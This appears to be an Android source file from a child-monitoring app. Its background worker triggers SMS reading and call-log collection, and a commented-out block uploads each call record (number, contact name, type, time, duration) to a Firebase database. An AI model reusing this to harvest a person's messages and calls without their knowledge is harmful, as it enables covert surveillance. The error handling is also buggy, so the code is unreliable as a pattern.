package com.ketan_studio.example.child001;

import android.Manifest;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

import static android.content.Context.MODE_PRIVATE;
import static com.ketan_studio.example.child001.MainActivity.instance;

public class SendDataWorker extends Worker {
    public String str_number, str_contact_name, str_call_type, str_call_full_date,
            str_call_date, str_call_time, str_call_duration;

    public static final String TAG = SendDataWorker.class.getSimpleName();

    public SendDataWorker(@NonNull Context appContext, @NonNull WorkerParameters workerParams) {
        super(appContext, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        Context context = getApplicationContext();
        Log.i(TAG, "Sending data to Server started");
        try {
            SendData(context);
        } catch (Exception e) {
            Result.retry();
            Toast.makeText(context, ""+e.getMessage(), Toast.LENGTH_SHORT).show();
            Log.d("NAMETAG","12222222"+e.getMessage());
        }
        return Result.success();
    }

    public void SendData(Context context) {
        Log.d("NAMETAG","1111");
//        GetAllCallLogs();
//        Log.d("NAMETAG","2222");
//        MainActivity.getInstance().GetAllCallLogs();
//        MainActivity.getInstance().Read_SMS();
//        Log.d("NAMETAG","Running");
        MainActivity.getInstance().RequestPermissionMain();
        MainActivity.getInstance().Read_SMS();
        MainActivity.getInstance().GetAllCallLogs();
        Log.d("NAMETAG","22222");

    }
//    public void GetAllCallLogs() {
//        Log.d("NAMETAG","3");
//        String sortOrder = android.provider.CallLog.Calls.DATE + " DESC";
//
//        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
//            // TODO: Consider calling
//            //    ActivityCompat#requestPermissions
//            // here to request the missing permissions, and then overriding
//            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
//            //                                          int[] grantResults)
//            // to handle the case where the user grants the permission. See the documentation
//            Toast.makeText(getApplicationContext(), "Permission Missing", Toast.LENGTH_SHORT).show();
//            // for ActivityCompat#requestPermissions for more details.
//            return;
//        }
//        Cursor cursor = getApplicationContext().getContentResolver().query(
//                CallLog.Calls.CONTENT_URI,
//                null,
//                null,
//                null,
//                sortOrder);
//        Log.d("NAMETAG","4");
//
//        //looping through the cursor to add data into arraylist
//        while (cursor.moveToNext()){
//            Log.d("NAMETAG","5");
//            str_number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
//            str_contact_name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
//            str_contact_name = str_contact_name==null || str_contact_name.equals("") ? "Unknown" : str_contact_name;
//            str_call_type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
//            str_call_full_date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
//            str_call_duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
//
//            SimpleDateFormat dateFormatter = new SimpleDateFormat(
//                    "dd MMM yyyy");
//            str_call_date = dateFormatter.format(new Date(Long.parseLong(str_call_full_date)));
//
//            SimpleDateFormat timeFormatter = new SimpleDateFormat(
//                    "HH:mm:ss");
//            str_call_time = timeFormatter.format(new Date(Long.parseLong(str_call_full_date)));
//
//            //str_call_time = getFormatedDateTime(str_call_time, "HH:mm:ss", "hh:mm ss");
//
//            switch(Integer.parseInt(str_call_type)){
//                case CallLog.Calls.INCOMING_TYPE:
//                    str_call_type = "Incoming";
//                    break;
//                case CallLog.Calls.OUTGOING_TYPE:
//                    str_call_type = "Outgoing";
//                    break;
//                case CallLog.Calls.MISSED_TYPE:
//                    str_call_type = "Missed";
//                    break;
//                case CallLog.Calls.VOICEMAIL_TYPE:
//                    str_call_type = "Voicemail";
//                    break;
//                case CallLog.Calls.REJECTED_TYPE:
//                    str_call_type = "Rejected";
//                    break;
//                case CallLog.Calls.BLOCKED_TYPE:
//                    str_call_type = "Blocked";
//                    break;
//                case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
//                    str_call_type = "Externally Answered";
//                    break;
//                default:
//                    str_call_type = "NA";
//            }
//
//            Log.d("NAMETAG","6");
//
//
//
//            SharedPreferences UsernamePreference = getApplicationContext().getSharedPreferences("UsernameCHILDPREFERENCE",MODE_PRIVATE);
//            String UserChildPREFERENCE = UsernamePreference.getString("UsernameCHILD","");
//            if (!UserChildPREFERENCE.equals("")){
//                Log.d("NAMETAG","7");
//                FirebaseDatabase database = FirebaseDatabase.getInstance();
//                DatabaseReference myRef = database.getReference("Child");
//                HashMap<String,Object> mapping = new HashMap<>();
//                mapping.put("CallDate",str_call_date);
//                mapping.put("Call_Duration",str_call_duration);
//                mapping.put("Call_Time",str_call_time);
//                mapping.put("Call_Type",str_call_type);
//                mapping.put("Contact_Name",str_contact_name);
//                mapping.put("Call_Number",str_number);
//                mapping.put("Running","2");
////                myRef.child(UserChildPREFERENCE).child("CallLog").child(str_call_date).child(str_call_time).setValue(mapping);
//                String result = str_call_date+str_call_time;
//                myRef.child(UserChildPREFERENCE).child("CallLog").child(result).setValue(mapping);
//                Toast.makeText(getApplicationContext(), "Activated", Toast.LENGTH_SHORT).show();
//                Log.d("NAMETAG","2222");
//            }
//            else {
//                Toast.makeText(instance, "Empty", Toast.LENGTH_SHORT).show();
//                Log.d("NAMETAG","8");
//            }
//            Log.d("NAMETAG","9");
//        }
//        Log.d("NAMETAG","10");
//    }


}
